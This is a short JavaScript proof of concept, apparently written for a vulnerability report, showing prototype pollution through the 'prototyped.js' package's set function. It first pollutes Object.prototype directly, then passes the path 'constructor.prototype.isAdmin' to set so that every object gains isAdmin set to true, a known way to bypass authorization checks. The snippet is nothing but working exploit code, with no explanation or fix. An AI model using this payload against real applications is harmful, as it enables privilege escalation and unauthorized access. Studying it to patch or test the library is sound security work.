var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
console.log({}.polluted);
const set = require('prototyped.js/dist/object/set').default;
set(obj, 'constructor.prototype.isAdmin', true);